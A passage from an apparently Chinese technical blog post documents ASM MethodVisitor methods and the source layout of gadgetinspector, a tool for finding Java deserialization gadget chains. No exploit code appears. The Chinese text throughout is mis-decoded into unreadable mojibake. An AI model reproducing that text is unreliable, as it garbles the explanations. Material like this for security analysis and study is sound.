class="line"><span class="comment"> * <span class="doctag">@param</span>numStackè¢«è®¿é—®å¸§ä¸­çš„æ“ä½œæ•°å †æ ˆå…ƒç´ ä¸ªæ•°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>stackè¢«è®¿é—®å¸§ä¸­çš„æ“ä½œæ•°å †æ ˆå…ƒç´ ç±»å‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitFrame</span><span class="params">(<span class="type">int</span> type, <span class="type">int</span> numLocal, java.lang.Object[] local, <span class="type">int</span> numStack, java.lang.Object[] stack)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®é›¶æ“ä½œæ•°çš„æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>opcodeè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œç </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitInsn</span><span class="params">(<span class="type">int</span> opcode)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®å•ä¸ª int ç±»å‹æ“ä½œæ•°çš„æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>opcodeè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œç ï¼šBIPUSHã€SIPUSHã€NEWARRAY</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>operandè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œæ•°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitIntInsn</span><span class="params">(<span class="type">int</span> opcode, <span class="type">int</span> operand)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®å±€éƒ¨å˜é‡æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> * å±€éƒ¨å˜é‡æŒ‡ä»¤æ˜¯åŠ è½½æˆ–å­˜å‚¨å±€éƒ¨å˜é‡å€¼çš„æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>opcodeè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œç ï¼šILOADã€LLOADã€FLOADã€DLOADã€ALOADã€ISTOREã€LSTOREã€FSTOREã€DSTOREã€ASTOREã€RET</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>varè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œæ•°ï¼ˆå±€éƒ¨å˜é‡çš„ä¸‹æ ‡ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitVarInsn</span><span class="params">(<span class="type">int</span> opcode, <span class="type">int</span> <span class="keyword">var</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®ç±»å‹æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> * ç±»å‹æŒ‡ä»¤æ˜¯ä»¥ç±»çš„å†…éƒ¨åç§°ä½œä¸ºå‚æ•°çš„æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>opcodeè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œç ï¼šNEWã€ANEWARRAYã€CHECKCASTã€INSTANCEOF</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>typeè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œæ•°ï¼ˆå¯¹è±¡æˆ–æ•°ç»„ç±»çš„å†…éƒ¨åç§°ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitTypeInsn</span><span class="params">(<span class="type">int</span> opcode, java.lang.String type)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®å­—æ®µæŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> * å­—æ®µæŒ‡ä»¤æ˜¯åŠ è½½æˆ–å­˜å‚¨å¯¹è±¡å­—æ®µå€¼çš„æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>opcodeè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œç ï¼šGETSTATICã€PUTSTATICã€GETFIELDã€PUTFIELD</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>ownerå­—æ®µæ‰€æœ‰è€…ç±»çš„å†…éƒ¨åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>nameå­—æ®µçš„åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptorå­—æ®µçš„æè¿°ç¬¦</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitFieldInsn</span><span class="params">(<span class="type">int</span> opcode, java.lang.String owner, java.lang.String name, java.lang.String descriptor)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®æ–¹æ³•æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> * æ–¹æ³•æŒ‡ä»¤æ˜¯è°ƒç”¨æ–¹æ³•çš„æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>opcodeè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œç ï¼šINVOKEVIRTUALã€INVOKESPECIALã€INVOKESTATICã€INVOKEINTERFACE</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>owneræ–¹æ³•æ‰€æœ‰è€…ç±»çš„å†…éƒ¨åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>nameæ–¹æ³•çš„åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptoræ–¹æ³•çš„æè¿°ç¬¦</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>isInterfaceæ–¹æ³•çš„æ‰€æœ‰è€…ç±»æ˜¯å¦ä¸ºæ¥å£</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMethodInsn</span><span class="params">(<span class="type">int</span> opcode, java.lang.String owner, java.lang.String name, java.lang.String descriptor, <span class="type">boolean</span> isInterface)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—® invokedynamic æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>nameæ–¹æ³•çš„åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptoræ–¹æ³•çš„æè¿°ç¬¦</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>bootstrapMethodHandleå¼•å¯¼æ–¹æ³•</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>bootstrapMethodArgumentså¼•å¯¼æ–¹æ³•çš„å¸¸é‡å‚æ•°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitInvokeDynamicInsn</span><span class="params">(java.lang.String name, java.lang.String descriptor, Handle bootstrapMethodHandle, java.lang.Object... bootstrapMethodArguments)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®è·³è½¬æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> * è·³è½¬æŒ‡ä»¤æ˜¯å¯ä»¥è·³è½¬åˆ°å¦ä¸€æ¡æŒ‡ä»¤çš„æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>opcodeè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œç ï¼šIFEQã€IFNEã€IFLTã€IFGEã€IFGTã€IFLEã€IF_ICMPEQã€IF_ICMPNEã€IF_ICMPLTã€IF_ICMPGEã€IF_ICMPGTã€IF_ICMPLEã€IF_ACMPEQã€IF_ACMPNEã€GOTOã€JSRã€IFNULLã€IFNONNULL</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>labelè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œæ•°ï¼ˆæ ‡ç­¾ï¼ŒæŒ‡å®šè·³è½¬æŒ‡ä»¤å¯ä»¥è·³è½¬åˆ°çš„æŒ‡ä»¤ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitJumpInsn</span><span class="params">(<span class="type">int</span> opcode, Label label)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®æ ‡ç­¾</span></span><br><span class="line"><span class="comment"> * æ ‡ç­¾æŒ‡å®šç´§éšå…¶åçš„æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>labelæ ‡ç­¾å¯¹è±¡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitLabel</span><span class="params">(Label label)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—® LDC æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>valueè¦åŠ è½½åˆ°å †æ ˆä¸Šçš„å¸¸æ•°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitLdcInsn</span><span class="params">(java.lang.Object value)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—® IINC æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>valueè¦é€’å¢çš„å±€éƒ¨å˜é‡çš„ç´¢å¼•</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>incrementé€’å¢çš„æ•°é‡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitIincInsn</span><span class="params">(<span class="type">int</span> <span class="keyword">var</span>, <span class="type">int</span> increment)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—® TABLESWITCH æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>minæœ€å°é”®å€¼</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>maxæœ€å¤§é”®å€¼</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>dflté»˜è®¤å¤„ç†ç¨‹åºå—çš„å¼€å§‹éƒ¨åˆ†</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>labelså¤„ç†ç¨‹åºå—çš„å¼€å§‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitTableSwitchInsn</span><span class="params">(<span class="type">int</span> min, <span class="type">int</span> max, Label dflt, Label... labels)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—® LOOKUPSWITCH æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>dflté»˜è®¤å¤„ç†ç¨‹åºå—çš„å¼€å§‹éƒ¨åˆ†</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>keysé”®å€¼</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>labelså¤„ç†ç¨‹åºå—çš„å¼€å§‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitLookupSwitchInsn</span><span class="params">(Label dflt, <span class="type">int</span>[] keys, Label[] labels)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—® MULTIANEWARRAY æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptoræ•°ç»„ç±»å‹çš„æè¿°ç¬¦</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>numDimensionsè¦åˆ†é…çš„æ•°ç»„çš„ç»´æ•°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMultiANewArrayInsn</span><span class="params">(java.lang.String descriptor, <span class="type">int</span> numDimensions)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®æŒ‡ä»¤ä¸Šçš„æ³¨é‡Š</span></span><br><span class="line"><span class="comment"> * å¿…é¡»åœ¨å¸¦æ³¨é‡Šçš„æŒ‡ä»¤ä¹‹åè°ƒç”¨æ­¤æ–¹æ³•ï¼Œå¯¹åŒä¸€æŒ‡ä»¤å¯ä»¥å¤šæ¬¡è°ƒç”¨</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>typeRefå¯¹æ³¨é‡Šç±»å‹çš„å¼•ç”¨</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>typePathtypeRef ä¸­å¸¦æ³¨é‡Šçš„ç±»å‹å‚æ•°/é€šé…ç¬¦ç»‘å®š/æ•°ç»„å…ƒç´ ç±»å‹/é™æ€å†…éƒ¨ç±»å‹çš„è·¯å¾„</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptoræ³¨é‡Šç±»çš„æè¿°ç¬¦</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>visibleè¿è¡Œæ—¶æ˜¯å¦å¯è§</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> AnnotationVisitor <span class="title function_">visitInsnAnnotation</span><span class="params">(<span class="type">int</span> typeRef, TypePath typePath, java.lang.String descriptor, <span class="type">boolean</span> visible)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—® try catch å—</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>startå¼‚å¸¸å¤„ç†ç¨‹åºèŒƒå›´çš„å¼€å§‹ï¼ˆåŒ…å«ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>endå¼‚å¸¸å¤„ç†ç¨‹åºèŒƒå›´çš„ç»“æŸï¼ˆä¸åŒ…å«ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>handlerå¼‚å¸¸å¤„ç†ç¨‹åºä»£ç çš„å¼€å¤´</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>typeç”±å¤„ç†ç¨‹åºå¤„ç†çš„å¼‚å¸¸ç±»å‹çš„å†…éƒ¨åç§°ï¼Œæˆ– null æ¥æ•è·ä»»ä½•å¼‚å¸¸ï¼ˆå¯¹ finally å—ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitTryCatchBlock</span><span class="params">(Label start, Label end, Label handler, java.lang.String type)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®å¼‚å¸¸å¤„ç†ç¨‹åºç±»å‹ä¸Šçš„æ³¨é‡Š</span></span><br><span class="line"><span class="comment"> * å¿…é¡»åœ¨ visitTryCatchBlock ä¹‹åè°ƒç”¨ï¼Œå¯¹åŒä¸€ä¸ªå¼‚å¸¸å¤„ç†ç¨‹åºå¯ä»¥å¤šæ¬¡è°ƒç”¨</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>typeRefå¯¹æ³¨é‡Šç±»å‹çš„å¼•ç”¨</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>typePathtypeRef ä¸­å¸¦æ³¨é‡Šçš„ç±»å‹å‚æ•°/é€šé…ç¬¦ç»‘å®š/æ•°ç»„å…ƒç´ ç±»å‹/é™æ€å†…éƒ¨ç±»å‹çš„è·¯å¾„</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptoræ³¨é‡Šç±»çš„æè¿°ç¬¦</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>visibleè¿è¡Œæ—¶æ˜¯å¦å¯è§</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> AnnotationVisitor <span class="title function_">visitTryCatchAnnotation</span><span class="params">(<span class="type">int</span> typeRef, TypePath typePath, java.lang.String descriptor, <span class="type">boolean</span> visible)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®æ–¹æ³•çš„æœ€å¤§å †æ ˆå¤§å°å’Œæœ€å¤§å±€éƒ¨å˜é‡æ•°é‡</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>maxStackæ–¹æ³•çš„æœ€å¤§å †æ ˆå¤§å°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>maxLocalsæ–¹æ³•çš„æœ€å¤§å±€éƒ¨å˜é‡æ•°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMaxs</span><span class="params">(<span class="type">int</span> maxStack, <span class="type">int</span> maxLocals)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®æ–¹æ³•çš„æœ«å°¾</span></span><br><span class="line"><span class="comment"> * è¯¥æ–¹æ³•æ˜¯æœ€åä¸€ä¸ªè¢«è°ƒç”¨çš„æ–¹æ³•ï¼Œç”¨äºé€šçŸ¥è®¿é—®è€…è¯¥æ–¹æ³•çš„æ‰€æœ‰æ³¨é‡Šå’Œå±æ€§å·²ç»è¢«è®¿é—®</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span></span><br></pre></td></tr></table></figure><h4 id="3-FieldVisitor"><a href="#3-FieldVisitor" class="headerlink" title="3. FieldVisitor"></a>3. FieldVisitor</h4><p>æ–¹æ³•è°ƒç”¨é¡ºåºï¼ˆè®¿é—®é¡ºåºï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( visitAnnotation | visitTypeAnnotation | visitAttribute )* visitEnd</span><br></pre></td></tr></table></figure><h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><p>JSRInlinerAdapter ç”¨äºç®€åŒ–ä»£ç åˆ†æï¼Œåˆ é™¤ JSR æŒ‡ä»¤å¹¶å†…è”å¼•ç”¨çš„å­ä¾‹ç¨‹ï¼ˆæ²¡æ‡‚ï¼‰</p><blockquote><p>A MethodVisitor that removes JSR instructions and inlines the referenced subroutines</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>methodVisitor   å°†ç”Ÿæˆçš„å†…è”æ–¹æ³•ä»£ç å‘é€åˆ°çš„æ–¹æ³•è®¿é—®è€…</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>access    æ–¹æ³•çš„è®¿é—®æ ‡å¿—ï¼ˆOpcodesï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>name    æ–¹æ³•çš„åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptor      æ–¹æ³•çš„æè¿°ç¬¦</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>signature    æ–¹æ³•çš„ç­¾å</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>exceptions      æ–¹æ³•å¼‚å¸¸ç±»çš„å†…éƒ¨åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> JSRInlinerAdapterâ€‹(MethodVisitor methodVisitor,</span><br><span class="line">                         <span class="type">int</span> access,</span><br><span class="line">                         java.lang.String name,</span><br><span class="line">                         java.lang.String descriptor,</span><br><span class="line">                         java.lang.String signature,</span><br><span class="line">                         java.lang.String[] exceptions)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x02-é¡¹ç›®ç»“æ„"><a href="#0x02-é¡¹ç›®ç»“æ„" class="headerlink" title="0x02 é¡¹ç›®ç»“æ„"></a>0x02 é¡¹ç›®ç»“æ„</h1><p>é¡¹ç›®ä¸­åŒ…å«ä¸‰ç§æ£€æµ‹å®ç°ï¼Œåœ¨ä»¥ä¸‹ä¸‰ä¸ªç›®å½•ä¸‹ï¼šjavaserial é’ˆå¯¹ Java åŸç”Ÿåºåˆ—åŒ–ï¼Œjackson é’ˆå¯¹ Jacksonï¼ˆJSON åº“ï¼‰ï¼Œxstream é’ˆå¯¹ XStreamï¼ˆXML åº“ï¼‰ï¼ŒåŒæ—¶åœ¨ config ç›®å½•ä¸‹å®ç°äº†å„è‡ªçš„é…ç½®æ¥å£ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ config      <span class="comment"># é…ç½®æ¥å£å’Œå…·ä½“å®ç°</span></span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ConfigRepository.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ GIConfig.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ JacksonDeserializationConfig.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ JavaDeserializationConfig.java</span><br><span class="line">â”‚Â Â  â””â”€â”€ XstreamDeserializationConfig.java</span><br><span class="line">â”œâ”€â”€ data        <span class="comment"># æ•°æ®çš„å­˜å‚¨æ ¼å¼ä»¥åŠè¯»å–æ–¹æ³•</span></span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ClassReference.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ DataFactory.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ DataLoader.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ GraphCall.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ InheritanceDeriver.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ InheritanceMap.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ MethodReference.java</span><br><span class="line">â”‚Â Â  â””â”€â”€ Source.java</span><br><span class="line">â”œâ”€â”€ jackson     <span class="comment"># JSON åº“</span></span><br><span class="line">â”‚Â Â  â”œâ”€â”€ JacksonImplementationFinder.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ JacksonSerializableDecider.java</span><br><span class="line">â”‚Â Â  â””â”€â”€ JacksonSourceDiscovery.java</span><br><span class="line">â”œâ”€â”€ javaserial  <span class="comment"># åŸç”Ÿåºåˆ—åŒ–</span></span><br><span class="line">â”‚Â Â  â”œâ”€â”€ SimpleImplementationFinder.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ SimpleSerializableDecider.java</span><br><span class="line">â”‚Â Â  â””â”€â”€ SimpleSourceDiscovery.java</span><br><span class="line">â”œâ”€â”€ xstream     <span class="comment"># XML åº“</span></span><br><span class="line">â”‚Â Â  â”œâ”€â”€ CustomXstreamSerializableDecider.java</span><br><span class="line">â”‚Â Â  â””â”€â”€ XstreamSerializableDecider.java</span><br><span class="line">â”œâ”€â”€ CallGraphDiscovery.java             <span class="comment"># æ–¹æ³•è°ƒç”¨é“¾ä¸­çš„æ±¡ç‚¹å‚æ•°ä¼ é€’å…³ç³»</span></span><br><span class="line">â”œâ”€â”€ ClassResourceEnumerator.java        <span class="comment"># ç±»æšä¸¾å™¨</span></span><br><span class="line">â”œâ”€â”€ GadgetChainDiscovery.java           <span class="comment"># æœç´¢åˆ©ç”¨é“¾</span></span><br><span class="line">â”œâ”€â”€ GadgetInspector.java                <span class="comment"># ä¸»ç±»ï¼Œç¨‹åºå…¥å£</span></span><br><span class="line">â”œâ”€â”€ ImplementationFinder.java           <span class="comment"># æ¥å£ï¼Œè·å–ç›®æ ‡æ–¹æ³•çš„å­ç±»å®ç°</span></span><br><span class="line">â”œâ”€â”€ MethodDiscovery.java                <span class="comment"># ç±»ä¿¡æ¯ã€æ–¹æ³•ä¿¡æ¯ã€ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line">â”œâ”€â”€ PassthroughDiscovery.java           <span class="comment"># æ–¹æ³•çš„è¿”å›å€¼ä¸å‚æ•°çš„å…³ç³»</span></span><br><span class="line">â”œâ”€â”€ SerializableDecider.java            <span class="comment"># åºåˆ—åŒ–å†³ç­–è€…æ¥å£</span></span><br><span class="line">â”œâ”€â”€ SourceDiscovery.java                <span class="comment"># æ±¡ç‚¹æºä¿¡æ¯</span></span><br><span class="line">â”œâ”€â”€ TaintTrackingMethodVisitor.java     <span class="comment"># æ–¹æ³•è®¿é—®è€…</span></span><br><span class="line">â””â”€â”€ Util.java                           <span class="comment"># å·¥å…·å‡½æ•°</span></span><br></pre></td></tr></table></figure><h2 id="gadgetinspector-x2F-data"><a href="#gadgetinspector-x2F-data" class="headerlink" title="gadgetinspector&#x2F;data"></a>gadgetinspector&#x2F;data</h2><p>ä¸»è¦æ˜¯æ•°æ®æ ¼å¼çš„å®šä¹‰ã€‚</p><h3 id="1-DataLoader"><a href="#1-DataLoader" class="headerlink" title="1. DataLoader"></a>1. 